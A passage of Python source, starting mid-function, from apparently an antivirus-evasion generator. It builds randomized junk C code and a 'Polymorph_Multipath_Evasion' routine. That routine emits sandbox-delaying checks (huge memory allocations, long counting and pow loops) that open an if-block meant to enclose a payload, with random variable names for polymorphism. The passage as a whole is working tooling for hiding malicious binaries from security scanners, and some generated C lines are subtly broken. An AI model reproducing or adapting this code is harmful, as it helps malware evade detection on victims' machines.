        Junkcode += "double " + Randcpt + "  = " + Randsmall + ";\n"
        Junkcode += "double " + Randi + " = " + Randsmall2 + ";\n"
        Junkcode += "while(" + Randcpt + " < " + Randbig + "){\n"
        Junkcode += Randcpt + " = pow(" + Randcpt + "," + Randi + ");}\n"

    elif number == 13: #BacktoNumb 

        Randbig1 = str(random.randrange(300000000,500000000,10))
        Randcpt= varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "while ( " + Randcpt + " > " + str(random.randrange(10,99,2)) + " ){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;}\n"

    elif number == 14: # double-Twin tower

        Randbig1 = str(random.randrange(5000000,7000000,10))
        Randbig2 = str(random.randrange(3000000,5000000,10))
        Randbig3 = str(random.randrange(2000000,4000000,10))
        Randbig4 = str(random.randrange(1000000,3000000,10))
        Randcpt= varname_creator()
        Randcpt2= varname_creator()
        Randcpt3= varname_creator()
        Randcpt4= varname_creator()
        Randi = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randcpt3 + "  = " + Randbig3 + ";\n"
        Junkcode += "int " + Randcpt4 + " = " + Randbig4 + ";\n"
        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "int " + Randcpt2 + " = " + Randbig2 + ";\n"
        Junkcode += "while ( " + Randcpt + " > 0 ){\n"
        Junkcode += "if (" + Randcpt + " > " + Randcpt2 + "){\n"
        Junkcode += "if (" + Randcpt + " > " + Randcpt3 + "){\n"
        Junkcode += "if (" + Randcpt + " > " + Randcpt4 + "){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;}\n"
        Junkcode += "else{\n"
        Junkcode += Randcpt4 + " = " + Randcpt4 + " - 1;}\n"
        Junkcode += "}else{\n"
        Junkcode += "if (" + Randcpt3 + " > " + Randcpt4 + "){\n"
        Junkcode += Randcpt3 + " = " + Randcpt3 + " - 1;}\n"
        Junkcode += "else{\n"
        Junkcode += Randcpt4 + " = " + Randcpt4 + " - 1;}}\n"
        Junkcode += "}else{\n"
        Junkcode += "if (" + Randcpt2 + " > " + Randcpt3 + "){\n"
        Junkcode += "if (" + Randcpt2 + " > " + Randcpt4 + "){\n"
        Junkcode += Randcpt2 + " = " + Randcpt2 + " - 1;}\n"
        Junkcode += "else{\n"
        Junkcode += Randcpt4 + " = " + Randcpt4 + " - 1;}\n"
        Junkcode += "}else{\n"
        Junkcode += "if (" + Randcpt3 + " > " + Randcpt4 + "){\n"
        Junkcode += Randcpt3 + " = " + Randcpt3 + " - 1;}\n"
        Junkcode += "else{\n"
        Junkcode += Randcpt4 + " = " + Randcpt4 + " - 1;}}}\n"
        Junkcode += "printf(\"%d\"," + Randcpt + ");}\n"


    elif number == 15: # Primes number in range using the Sieve of Sundaram 

        RandArraySize = varname_creator()
        RandRange = str(random.randint(65000000,85000000))
        RandPrimeVar = varname_creator() 
        RandPrimeNumb = varname_creator()
        RandSizeVar = varname_creator()
        IsPrime = varname_creator()
        RandN = varname_creator() 
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + RandPrimeVar + " = 0;\n"
        Junkcode += "int " + RandArraySize + " = " + RandRange + ";\n"
        Junkcode += "int " + RandN + " = " + RandRange + " / 2;\n"
        Junkcode += "int " + RandSizeVar + ";\n"
        Junkcode += "int* " + IsPrime + " = malloc(sizeof(int) * (" + RandArraySize + " + 1));\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandN + ";" + Randflag + "++){\n" 
        Junkcode += IsPrime + "[" + Randflag + "] = " + Randflag + ";}\n"
        Junkcode += "for(" + Randflag + " = 1;" + Randflag + " < " + RandN + ";" + Randflag + "++){\n"
        Junkcode += "for(" + Randflag2 + " = " + Randflag + ";" + Randflag2 + " <= (" + RandN + " - " + Randflag + ")/(2 * " + Randflag + " + 1);" + Randflag2 + "++){\n"  
        Junkcode += IsPrime + "[" + Randflag + " + " + Randflag2 + " + 2 * " + Randflag + " + " + Randflag2 + "] = 0;}}\n"
        Junkcode += "if(" + RandArraySize + " > 2){\n"
        Junkcode += IsPrime + "[" + RandPrimeVar + "++] = 2;}\n"
        Junkcode += "for(" + Randflag + " = 1;" + Randflag + " < " + RandN + ";" + Randflag + "++){\n"
        Junkcode += "if(" + IsPrime + "[" + Randflag + "] != 0){\n"
        Junkcode += IsPrime + "[" + RandPrimeVar + "++] = " + Randflag + " * 2 + 1;}}\n"
        Junkcode += RandSizeVar + " = sizeof " + IsPrime + " / sizeof(int);\n"
        Junkcode += "int " + RandPrimeNumb + " = 0;\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandSizeVar + ";" + Randflag + "++){\n"       
        Junkcode += "if(" + IsPrime + "[" + Randflag + "] != 0){\n"
        Junkcode += RandPrimeNumb + " ++;}}\n"
        Junkcode += "free(" + IsPrime +");\n"

    elif number == 16: # Primes number in range using the Sieve of Eratosthenes 

        RandRange = str(random.randint(40000000,55000000))
        RandPrimeVar = varname_creator() 
        RandVar = varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "unsigned long long int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int *" + RandPrimeVar + ";\n"    
        Junkcode += "int " + RandVar + " = 1;\n"  
        Junkcode += RandPrimeVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 2;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandPrimeVar + "[" + Randflag + "] = 1;}\n"
        Junkcode += "for(" + Randflag + " = 2;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += "if(" + RandPrimeVar + "[" + Randflag + "]){\n"
        Junkcode += "for(" + Randflag2 + " = " + Randflag + ";" + Randflag + " * " + Randflag2 + " < " + RandRange + ";" + Randflag2 + "++){\n"
        Junkcode += RandPrimeVar + "[" + Randflag + " * " + Randflag2 + "] = 0;}}}\n"
        Junkcode += "free(" + RandPrimeVar + ");\n"

    elif number == 17: # Random numbers 

        RandRange = str(random.randint(60000000,90000000))
        RandPrimeVar = varname_creator() 
        RandVar = varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + "," + Randflag2 + " = 0;\n"
        Junkcode += "float* " + RandVar + " = malloc(sizeof(float) * " + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += Randflag2 + " = rand() % 400;\n"
        Junkcode += "if(" + Randflag2 + " > 360){\n"
        Junkcode += RandVar + "[" + Randflag + "] = 0;\n}"
        Junkcode += "else if(" + Randflag2 + " < 0){\n"
        Junkcode += RandVar + "[" + Randflag + "] = 0;\n}"
        Junkcode += "else {\n"
        Junkcode += RandVar + "[" + Randflag + "] = " + Randflag2 + " * 0.1 / 360;\n}}"
        Junkcode += "free(" + RandVar + ");\n"     

    elif number == 18: # Average 1

        RandRange = str(random.randint(55000000,75000000))
        RandSum = varname_creator()
        RandSum2 = varname_creator()
        RandAverage = varname_creator()
        RandVariance = varname_creator()
        RandDevStd = varname_creator() 
        RandVar = varname_creator()
        Randflag = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int " + RandSum + " = 0;int " + RandSum2 + " = 0;\n"
        Junkcode += "float " + RandAverage + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 30;}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandSum + " = " + RandSum + " + " + RandVar + "[" + Randflag + "];}\n"
        Junkcode += RandAverage + "/((float)" + RandRange + ");\n"
        Junkcode += "free(" + RandVar + ");\n"

    elif number == 19: # Average 2

        RandRange = str(random.randint(65000000,85000000))
        RandSum = varname_creator()
        RandSum2 = varname_creator()
        RandAverage = varname_creator()
        RandVariance = varname_creator()
        RandDevStd = varname_creator() 
        RandVar = varname_creator()
        Randflag = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int " + RandSum + " = 0;int " + RandSum2 + " = 0;\n"
        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "float " + RandAverage + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 25;\n"
        Junkcode += RandSum + " = " + RandSum + " + " + RandVar + "[" + Randflag + "];}\n"
        Junkcode += RandAverage + "/((float)" + RandRange + ");\n"
        Junkcode += "free(" + RandVar + ");\n"


    elif number == 20: # Average,Variance & Standard Deviation

        RandRange = str(random.randint(10000000,25000000))
        RandSum = varname_creator()
        RandSum2 = varname_creator()
        RandAverage = varname_creator()
        RandVariance = varname_creator()
        RandDevStd = varname_creator() 
        RandVar = varname_creator()
        Randflag = varname_creator()
        Junkcode = ""
        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int " + RandSum + " = 0;int " + RandSum2 + " = 0;\n"
        Junkcode += "float " + RandAverage + "," + RandVariance + "," + RandDevStd + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 35;}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandSum + " = " + RandSum + " + " + RandVar + "[" + Randflag + "];}\n"
        Junkcode += RandAverage + "/((float)" + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandSum2 + " = " + RandSum2 + " + pow((" + RandVar + "[" + Randflag + "]" + " - " + RandAverage + "),2);}\n"
        Junkcode += RandVariance + " = " + RandSum2 + "/((float)" + RandRange + ");\n"
        Junkcode += RandDevStd + " = sqrt(" + RandVariance + ");\n" 
        Junkcode += "free(" + RandVar + ");\n"

    elif number == 21: # Reverse Array 1

        RandRange = str(random.randint(100000000,130000000))
        RandSum = varname_creator() 
        RandVar = varname_creator()
        RandRevVar = varname_creator()
        Randflag = varname_creator()
        RandLenght = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandRevVar + " = (int*)malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int " + RandLenght + " = " + RandRange + " - 1;\n"       
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 300;}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandRevVar + "[" + Randflag + "] = " + RandVar + "[" + RandLenght + "];\n"
        Junkcode += RandLenght + " = " + RandLenght + " - 1;}\n"
        Junkcode += "free(" + RandVar + ");free(" + RandRevVar + ");\n"

    elif number == 22: # Reverse Array 2

        RandRange = str(random.randint(80000000,110000000))
        RandSum = varname_creator() 
        RandVar = varname_creator()
        RandRevVar = varname_creator()
        Randflag = varname_creator()
        RandLenght = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandRevVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int " + RandLenght + " = " + RandRange + " - 1;\n"       
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 300;\n"
        Junkcode += RandRevVar + "[" + Randflag + "] = " + RandVar + "[" + RandLenght + "];\n"
        Junkcode += RandLenght + " = " + RandLenght + " - 1;}\n"
        Junkcode += "free(" + RandVar + ");free(" + RandRevVar + ");\n"



    elif number == 23: # Check if matrix is sparse 1 

        Randi = str(random.randint(8000,12000))
        Randj = str(random.randint(8000,12000))
        Randmatr= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        RandIntResult = varname_creator()
        RandIsSparse = varname_creator()
        Junkcode = ""
        Junkcode += "int " + RandIntResult + " = 0;\n"
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + RandIsSparse + " = 0;\n"
        Junkcode += "int (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(int) * " + Randi + " * " + Randj + ");\n"              
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n"
        Junkcode += "for(" + Randflag2 + " = 0;" + Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "][" + Randflag2 + "] = rand() % 100;\n"
        Junkcode += "if(" + Randmatr + "[" + Randflag + "]" + "[" + Randflag2 + "] == 0){\n"
        Junkcode += RandIsSparse + "++;}}}\n"
        Junkcode += "if(" + RandIsSparse + " == ((" + Randi + " * " + Randj + ") / 2)){\n"
        Junkcode += RandIntResult + " = 1;}\n"
        Junkcode += "free(" + Randmatr + ");\n"


    elif number == 24: # Check if matrix is sparse 2 

        Randi = str(random.randint(8000,12000))
        Randj = str(random.randint(8000,12000))
        Randmatr= varname_creator()
        Randflag = varname_creator()
        Randflag2 = varname_creator()
        RandIntResult = varname_creator()
        RandIsSparse = varname_creator()
        Junkcode = ""
        Junkcode += "int (*" + Randmatr + ")[" + Randj + "] = malloc(sizeof(int) * " + Randi + " * " + Randj + ");\n"
        Junkcode += "int " + RandIsSparse + " = 0;\n"
        Junkcode += "int " + Randflag + "," + Randflag2 + ";\n"
        Junkcode += "int " + RandIntResult + " = 1;\n"               
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n"
        Junkcode += "for(" + Randflag2 + " = 0;" + Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += Randmatr + "[" + Randflag + "][" + Randflag2 + "] = rand() % 100;}}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + Randi + ";" + Randflag + "++){\n"
        Junkcode += "for(" + Randflag2 + " = 0;" + Randflag2 + " < " + Randj + ";" + Randflag2 + "++){\n"
        Junkcode += "if(" + Randmatr + "[" + Randflag + "][" + Randflag2 + "] == 0){\n"
        Junkcode += RandIsSparse + "++;\n}}}"
        Junkcode += "if(" + RandIsSparse + " != ((" + Randi + " * " + Randj + ") / 2)){\n"
        Junkcode += RandIntResult + " = 0;}\n"
        Junkcode += "free(" + Randmatr + ");\n"


    elif number == 25: # BacktoNumb2 

        Randbig1 = str(random.randrange(500000000,800000000,10))
        Randcpt= varname_creator()
        Randcpt2= varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randcpt + ";\n"
        Junkcode += "int " + Randcpt2 + " = " + Randbig1 + ";\n"
        Junkcode += "for(" + Randcpt + " = " + Randbig1 + ";" + Randcpt + " > " + str(random.randrange(10,99,2)) + ";" + Randcpt + "--){\n"
        Junkcode += Randcpt2 + " = " + Randcpt2 + " - 1;}\n"

    elif number == 26: # Double Reverse Array 1 

        RandRange = str(random.randint(35000000,45000000))
        RandSum = varname_creator() 
        RandVar = varname_creator()
        RandRevVar = varname_creator()
        RandVar2 = varname_creator()
        RandRevVar2 = varname_creator()
        Randflag = varname_creator()
        RandLenght = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandVar2 + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandRevVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandRevVar2 + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int " + RandLenght + " = " + RandRange + " - 1;\n"       
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 300;\n"
        Junkcode += RandVar2 + "[" + Randflag + "] = rand() % 300;}\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandRevVar + "[" + Randflag + "] = " + RandVar + "[" + RandLenght + "];\n"
        Junkcode += RandRevVar2 + "[" + Randflag + "] = " + RandVar2 + "[" + RandLenght + "];\n"
        Junkcode += RandLenght + " = " + RandLenght + " - 1;}\n"
        Junkcode += "free(" + RandVar + ");free(" + RandVar2 + ");free(" + RandRevVar + ");free(" + RandRevVar2 + ");\n"


    elif number == 27: # Double Reverse Array 2

        RandRange = str(random.randint(40000000,55000000))
        RandSum = varname_creator() 
        RandVar = varname_creator()
        RandRevVar = varname_creator()
        RandVar2 = varname_creator()
        RandRevVar2 = varname_creator()
        Randflag = varname_creator()
        RandLenght = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "int* " + RandVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandVar2 + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandRevVar + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int* " + RandRevVar2 + " = malloc(sizeof(int) * " + RandRange + ");\n"
        Junkcode += "int " + RandLenght + " = " + RandRange + " - 1;\n"       
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 300;\n"
        Junkcode += RandVar2 + "[" + Randflag + "] = rand() % 300;\n"
        Junkcode += RandRevVar + "[" + Randflag + "] = " + RandVar + "[" + RandLenght + "];\n"
        Junkcode += RandRevVar2 + "[" + Randflag + "] = " + RandVar2 + "[" + RandLenght + "];\n"
        Junkcode += RandLenght + " = " + RandLenght + " - 1;}\n"
        Junkcode += "free(" + RandVar + ");free(" + RandVar2 + ");free(" + RandRevVar + ");free(" + RandRevVar2 + ");\n"

    elif number == 28: # Average,Variance & Standard Deviation 2  

        RandRange = str(random.randint(10000000,25000000))
        RandSum = varname_creator()
        RandSum2 = varname_creator()
        RandAverage = varname_creator()
        RandVariance = varname_creator()
        RandDevStd = varname_creator() 
        RandVar = varname_creator()
        Randflag = varname_creator()
        Junkcode = ""
        Junkcode += "int " + RandSum + " = 0;int " + RandSum2 + " = 0;\n"
        Junkcode += "int *" + RandVar + " = malloc(sizeof(int)*" + RandRange + ");\n"
        Junkcode += "float " + RandAverage + "," + RandVariance + "," + RandDevStd + ";\n"
        Junkcode += "int " + Randflag + ";\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandVar + "[" + Randflag + "] = rand() % 35;\n"
        Junkcode += RandSum + " = " + RandSum + " + " + RandVar + "[" + Randflag + "];}\n"
        Junkcode += RandAverage + "/((float)" + RandRange + ");\n"
        Junkcode += "for(" + Randflag + " = 0;" + Randflag + " < " + RandRange + ";" + Randflag + "++){\n"
        Junkcode += RandSum2 + " = " + RandSum2 + " + pow((" + RandVar + "[" + Randflag + "]" + " - " + RandAverage + "),2);}\n"
        Junkcode += RandVariance + " = " + RandSum2 + "/((float)" + RandRange + ");\n"
        Junkcode += RandDevStd + " = sqrt(" + RandVariance + ");\n" 
        Junkcode += "free(" + RandVar + ");\n"
       
                 
    return Junkcode


def Polymorph_Multipath_Evasion():

    number = random.randint(1,7)



    if number == 1: # Giant memory allocation 

        Randmem = varname_creator()
        Randbig = str(random.randrange(30000000,100000000,1024))
        Evasion_code = ""
        Evasion_code += "char *" + Randmem + " = NULL;\n"
        Evasion_code += Randmem + " = (char *) malloc("+ Randbig + ");\n"
        Evasion_code += "if ("+ Randmem + "!=NULL){\n"
        Evasion_code += "memset(" + Randmem + ",00," + Randbig + ");\n"
        Evasion_code += "free(" + Randmem + ");\n"


    elif number == 2: # Loooooong Counter 

        Randbig = str(random.randrange(100000000,990000000,1000))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "int " + Randcpt + "  = 0;\n"
        Evasion_code += "int " + Randi + " = 0;\n"
        Evasion_code += "for("+ Randi + " = 0;" + Randi + " < " + Randbig + "; " + Randi + "++){\n"
        Evasion_code += Randcpt + "++;}\n"
        Evasion_code += "if("+ Randcpt + " == " + Randbig + "){\n"


    elif number == 3: # Loooooong Counter 2

        Randbig = str(random.randrange(100000000,990000000,1000))
        Randcpt= varname_creator()
        Evasion_code = ""
        Evasion_code += "int " + Randcpt + "  = 0;\n"
        Evasion_code += "while(" + Randcpt + " < " + Randbig + "){\n"
        Evasion_code += Randcpt + "++;}\n"
        Evasion_code += "if("+ Randcpt + " == " + Randbig + "){\n"


    elif number == 4: # am i zero?

        Randbig = str(random.randrange(100000000,990000000,10))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "int " + Randi + " = 0;\n"
        Evasion_code += "int " + Randcpt + "  = " + Randbig + ";\n"
        Evasion_code += "while ( " + Randcpt + " > 0 ){\n"
        Evasion_code += Randcpt + " = " + Randcpt + " - 1;}\n"
        Evasion_code += "if("+ Randcpt + " == 0){\n"

    elif number == 5: # powf counter 

        Randsmall = str(random.uniform(1.100,2.000))
        Randsmall2 = str(random.uniform(1.100,2.000))
        Randbig = str(random.randrange(10000,100000,100))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "float " + Randcpt + "  = " + Randsmall + ";\n"
        Evasion_code += "float " + Randi + " = " + Randsmall2 + ";\n"
        Evasion_code += "while(" + Randcpt + " < " + Randbig + "){\n"
        Evasion_code += Randcpt + " = powf(" + Randcpt + "," + Randi + ");}\n"
        Evasion_code += "if("+ Randcpt + " >= " + Randbig + "){\n"

    elif number == 6: # pow counter 

        Randsmall = str(random.uniform(1.100,3.000))
        Randsmall2 = str(random.uniform(1.100,3.000))
        Randbig = str(random.randrange(10000,99000,100))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "double " + Randcpt + "  = " + Randsmall + ";\n"
        Evasion_code += "double " + Randi + " = " + Randsmall2 + ";\n"
        Evasion_code += "while(" + Randcpt + " < " + Randbig + "){\n"
        Evasion_code += Randcpt + " = pow(" + Randcpt + "," + Randi + ");}\n"
        Evasion_code += "if("+ Randcpt + " >= " + Randbig + "){\n"

    elif number == 7: # am i numb?

        Randbig = str(random.randrange(100000000,200000000,10))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "int " + Randi + " = " + str(random.randrange(10,99,2)) + ";\n"
        Evasion_code += "int " + Randcpt + "  = " + Randbig + ";\n"
        Evasion_code += "while ( " + Randcpt + " > " + Randi + " ){\n"
        Evasion_code += Randcpt + " = " + Randcpt + " - 1;}\n"
        Evasion_code += "if("+ Randcpt + " == " + Randi + "){\n"

    return Evasion_code

    
          
def varname_creator():
    varname = ""
    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(8,18)))
    return varname 



